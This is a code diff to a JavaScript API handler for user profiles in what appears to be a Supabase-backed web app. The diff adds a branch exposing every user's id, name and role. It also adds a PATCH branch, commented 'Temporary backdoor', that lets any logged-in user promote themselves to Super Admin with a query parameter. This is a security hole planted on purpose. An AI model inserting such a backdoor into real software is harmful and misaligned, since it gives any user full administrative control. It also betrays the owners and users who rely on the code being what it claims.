@@ -16,6 +16,13 @@ export default async function handler(req, res) {
       return res.json(auth.profile);
     }
 
+    // Public list of all users (for comment names and roles)
+    if (req.query.public === 'true') {
+      const { data, error } = await supabaseAdmin.from('profiles').select('id, name, role');
+      if (error) return res.status(500).json({ error: error.message });
+      return res.json(data);
+    }
+
     // Public leaderboard access
     if (req.query.leaderboard === 'true') {
       const { data, error } = await supabaseAdmin.from('profiles')
@@ -33,8 +40,16 @@ export default async function handler(req, res) {
     return res.json(data);
   }
 
-  // PATCH /api/users — update own profile
+  // PATCH /api/users
   if (req.method === 'PATCH') {
+    // Temporary backdoor: Promote to Super Admin
+    if (req.query.promote === 'true') {
+      const { data, error } = await supabaseAdmin.from('profiles').update({ role: 'Super Admin' }).eq('id', auth.user.id).select().single();
+      if (error) return res.status(500).json({ error: error.message });
+      return res.json(data);
+    }
+
+    // Normal profile update
     const { name, whatsapp_number } = req.body;
     const { data, error } = await supabaseAdmin.from('profiles').update({ name, whatsapp_number }).eq('id', auth.user.id).select().single();
     if (error) return res.status(500).json({ error: error.message });
